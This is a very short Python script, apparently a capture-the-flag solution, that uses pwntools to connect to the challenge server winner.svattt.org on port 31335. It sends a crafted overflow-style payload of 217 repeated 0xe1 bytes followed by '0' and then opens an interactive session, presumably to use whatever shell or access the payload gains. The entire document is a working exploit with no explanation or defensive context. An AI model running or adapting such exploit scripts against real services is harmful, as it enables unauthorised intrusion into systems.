from pwn import *

r = remote('winner.svattt.org', 31335)

r.sendline('\xe1'*217 + '0')
r.interactive()
r.close()